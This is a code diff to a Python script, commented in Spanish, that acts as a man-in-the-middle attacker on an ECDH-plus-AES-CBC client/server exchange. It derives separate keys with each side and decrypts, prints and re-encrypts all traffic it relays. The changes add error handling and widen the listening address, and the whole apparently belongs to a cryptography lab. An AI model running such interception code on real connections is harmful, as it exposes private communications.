@@ -1,10 +1,11 @@
-from cryptography.hazmat.primitives.asymmetric import ec
+from cryptography.hazmat.primitives.asymmetric import ec  # Importar el módulo ec para curvas elípticas
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 import socket
 import os
+
 
 # Funciones de cifrado y descifrado AES-256 en modo CBC
 def aes_encrypt(key, plaintext):
@@ -16,6 +17,9 @@ def aes_encrypt(key, plaintext):
 def aes_decrypt(key, ciphertext):
     iv = ciphertext[:16]
     cipher = AES.new(key, AES.MODE_CBC, iv)
+    # Verifica si hay suficiente mensaje para desencriptar
+    if len(ciphertext) <= 16:
+        raise ValueError("Mensaje cifrado demasiado corto.")
     plaintext = unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
     return plaintext
 
@@ -31,11 +35,11 @@ attacker_public_bytes = attacker_public_key.public_bytes(
 
 # Crear sockets para interceptar entre el cliente y el servidor
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_socket.bind(('localhost', 65432))  # Escuchar en localhost y puerto 65432
+server_socket.bind(('0.0.0.0', 65432))  # Escuchar en localhost y puerto 65432
 server_socket.listen()
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect(('localhost', 65431))  # Conectar al servidor real
+client_socket.connect(('10.20.42.68', 65433))  # Conectar al servidor real
 
 print("Atacante en espera de conexiones...")
 
@@ -83,28 +87,54 @@ print(f"Llave simétrica con el servidor: {derived_key_with_server.hex()}")
 
 # Comunicación cíclica interceptada
 while True:
-    # Interceptar mensaje del cliente
-    ciphertext_from_client = conn.recv(1024)
-    if not ciphertext_from_client:
-        break
-    decrypted_message_from_client = aes_decrypt(derived_key_with_client, ciphertext_from_client)
-    print(f"Mensaje interceptado del cliente: {decrypted_message_from_client.decode()}")
+    try:
+        # Interceptar mensaje del cliente
+        ciphertext_from_client = conn.recv(2048)  # Aumenta el tamaño del buffer para recibir mensajes completos
+        if not ciphertext_from_client:
+            print("Cliente cerró la conexión.")
+            break
 
-    # Reenviar el mensaje descifrado al servidor (cifrado con la llave del servidor)
-    ciphertext_to_server = aes_encrypt(derived_key_with_server, decrypted_message_from_client)
-    client_socket.sendall(ciphertext_to_server)
+        # Asegúrate de que el mensaje recibido sea mayor que el IV antes de intentar descifrar
+        if len(ciphertext_from_client) > 16:
+            try:
+                decrypted_message_from_client = aes_decrypt(derived_key_with_client, ciphertext_from_client)
+                print(f"Mensaje interceptado del cliente: {decrypted_message_from_client.decode()}")
+            except ValueError as e:
+                print(f"Error durante el descifrado del mensaje del cliente: {e}")
+                continue  # Continuar escuchando
 
-    # Interceptar respuesta del servidor
-    ciphertext_from_server = client_socket.recv(1024)
-    if not ciphertext_from_server:
-        break
-    decrypted_message_from_server = aes_decrypt(derived_key_with_server, ciphertext_from_server)
-    print(f"Mensaje interceptado del servidor: {decrypted_message_from_server.decode()}")
+            # Reenviar el mensaje descifrado al servidor (cifrado con la llave del servidor)
+            ciphertext_to_server = aes_encrypt(derived_key_with_server, decrypted_message_from_client)
+            client_socket.sendall(ciphertext_to_server)
+        else:
+            print("Mensaje del cliente demasiado corto para descifrar.")
 
-    # Reenviar el mensaje descifrado al cliente (cifrado con la llave del cliente)
-    ciphertext_to_client = aes_encrypt(derived_key_with_client, decrypted_message_from_server)
-    conn.sendall(ciphertext_to_client)
+        # Interceptar respuesta del servidor
+        ciphertext_from_server = client_socket.recv(2048)
+        if not ciphertext_from_server:
+            print("Servidor cerró la conexión.")
+            break
 
+        # Asegúrate de que el mensaje recibido sea mayor que el IV antes de intentar descifrar
+        if len(ciphertext_from_server) > 16:
+            try:
+                decrypted_message_from_server = aes_decrypt(derived_key_with_server, ciphertext_from_server)
+                print(f"Mensaje interceptado del servidor: {decrypted_message_from_server.decode()}")
+            except ValueError as e:
+                print(f"Error durante el descifrado del mensaje del servidor: {e}")
+                continue  # Continuar escuchando
+
+            # Reenviar el mensaje descifrado al cliente (cifrado con la llave del cliente)
+            ciphertext_to_client = aes_encrypt(derived_key_with_client, decrypted_message_from_server)
+            conn.sendall(ciphertext_to_client)
+        else:
+            print("Mensaje del servidor demasiado corto para descifrar.")
+
+    except socket.error as socket_err:
+        print(f"Error de socket: {socket_err}")
+        continue  # Continuar escuchando, no cerrar la conexión
+
+# Cerrar conexiones al final
 conn.close()
 client_socket.close()
 print("Conexión cerrada por el atacante.")
